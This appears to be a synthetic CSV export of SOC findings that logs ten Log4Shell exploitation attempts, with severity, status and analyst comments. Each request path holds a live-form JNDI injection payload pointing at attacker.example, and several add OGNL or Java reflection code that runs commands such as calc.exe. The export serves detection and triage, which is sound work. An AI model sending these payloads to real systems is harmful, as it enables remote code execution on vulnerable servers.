"FINDING_ID","DETECTED_AT","FINDING_TYPE","SEVERITY","STATUS","STATUS_COMMENT","TIMESTAMP","IP_ADDRESS","REQUEST_PATH","REQUEST_METHOD","STATUS_CODE","BYTES_SENT","BACKEND_IP","DESCRIPTION","LAST_UPDATED_AT","LAST_UPDATED_BY","EMAIL_SENT","EMAIL_SENT_AT"
1,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","INVESTIGATING","SOC analyst reviewing source IP reputation and payload patterns.","2023-05-08 20:23:17.000","31.140.182.99","/home/css/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","POST",403,5453,"192.168.12.103","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:14:01.492","ANALYST",true,"2026-04-07 10:12:56.706"
2,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","162.134.122.120","/register/assets/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""calc.exe""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",401,1086,"172.18.215.8","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
3,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","CRITICAL","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","161.141.150.62","/home/assets/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","PUT",200,5095,"192.168.133.4","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
4,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","161.73.22.137","/profile/docs/${jndi:ldap://attacker.example/Exploit}.html","PUT",401,6543,"10.71.66.150","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
5,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","175.171.84.167","/about/docs/${jndi:ldap://attacker.example/Exploit#{""""[""getClass""]()[""forName""](""java.lang.Runtime"").getMethod(""getRuntime"",null).invoke(null,null).exec(""calc.exe"")}}.html","DELETE",403,1775,"192.168.5.24","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
6,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","193.113.35.134","/about/css/${jndi:ldap://attacker.example/Exploit#{injection}}.html","PUT",404,6885,"10.93.203.234","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
7,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","31.188.196.253","/profile/assets/${jndi:ldap://attacker.example/Exploit}.html","DELETE",401,9288,"192.168.40.191","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
8,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","MEDIUM","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","195.13.160.88","/home/js/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","GET",403,8578,"172.30.176.227","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
9,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","184.153.24.214","/register/images/${jndi:ldap://attacker.example/Exploit#${{7*7}}}.html","GET",301,4099,"192.168.68.180","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
10,"2026-04-07 10:10:17.047","Log4Shell Exploitation Attempt","HIGH","OPEN","Auto-detected by Log4Shell detection procedure","2023-05-08 20:23:17.000","183.37.92.158","/home/css/${jndi:ldap://attacker.example/Exploit#{#_memberAccess[""allowStaticMethodAccess""]=true,#a=(new java.lang.ProcessBuilder(new java.lang.String[]{""cmd.exe"",""/c"",""echo YmFzZTY0IC9kZXYvdGNwL3N0YXJ0""})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#output=#context.get(""com.opensymphony.xwork2.dispatcher.HttpServletResponse""),#output.getWriter().println(#e),#output.getWriter().flush(),#output.getWriter().close()}}.html","PUT",302,4768,"192.168.182.192","Direct JNDI lookup injection - CVE-2021-44228","2026-04-07 10:10:17.047","ANALYST",true,"2026-04-07 10:12:56.706"
